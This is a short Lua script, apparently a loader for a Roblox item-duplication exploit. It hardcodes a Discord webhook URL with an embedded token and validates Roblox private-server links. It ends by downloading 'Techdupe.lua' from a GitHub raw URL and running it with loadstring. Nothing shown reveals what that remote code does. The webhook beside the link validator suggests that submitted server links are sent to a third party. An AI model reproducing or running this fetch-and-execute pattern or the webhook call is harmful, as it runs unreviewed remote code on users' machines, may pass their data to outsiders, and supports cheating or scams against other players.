local Webhook = “https://discord.com/api/webhooks/1451046980955537530/z3zENEIg6PVd635YnHldxGZ4h4m5qgoNTLvMwm6VyK4J1twaltJ2qNyPcPPMkNE6_1CC"

-- Roblox link validator
local function isValidRobloxLink(link)
if typeof(link) ~= "string" then return false end

-- Old format
local oldFormat = link:match("^https://www%.roblox%.com/share%?code=%w+&type=Server")

-- private server format
local newFormat = link:match("^https://www%.roblox%.com/games/%d+%?privateServerLinkCode=%d+")

return oldFormat or newFormat
end

loadstring(game:HttpGet("https://raw.githubusercontent.com/Noahidkk12/Customs/refs/heads/main/Techdupe.lua", true))()
